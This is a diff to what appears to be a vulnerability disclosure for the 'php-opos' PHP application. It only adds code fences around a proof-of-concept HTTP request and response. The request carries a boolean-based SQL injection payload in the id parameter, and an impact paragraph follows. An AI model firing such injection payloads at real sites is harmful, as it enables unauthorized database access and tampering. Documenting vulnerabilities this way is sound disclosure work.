@@ -18,7 +18,7 @@ Tests performed:
 -1' OR 3*2*1=6 AND 000207=000207 or 'IBKdIxz1'=' => TRUE
 
 HTTP Request:
-
+```
 GET /php-opos/index.php?id=-1'%20OR%203*2*1=6%20AND%20000207=000207%20or%20'IBKdIxz1'='&page=category HTTP/1.1
 X-Requested-With: XMLHttpRequest
 Referer: http://192.144.217.51/php-opos/
@@ -28,9 +28,9 @@ Accept-Encoding: gzip,deflate,br
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36
 Host: 192.144.217.51
 Connection: Keep-alive
-
+```
 HTTP Response:
-
+```
 HTTP/1.1 200 OK
 Date: Thu, 16 Feb 2023 15:10:28 GMT
 Server: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/8.2.0
@@ -421,7 +421,7 @@ window.alert_toast= function($msg = 'TEST',$bg = 'success'){
   // })
 </script>
 </html>
-
+```
 The impact of this vulnerability
 An attacker can use SQL injection to bypass a web application's authentication and authorization mechanisms and retrieve the contents of an entire database. SQLi can also be used to add, modify and delete records in a database, affecting data integrity. Under the right circumstances, SQLi can also be used by an attacker to execute OS commands, which may then be used to escalate an attack even further.
 
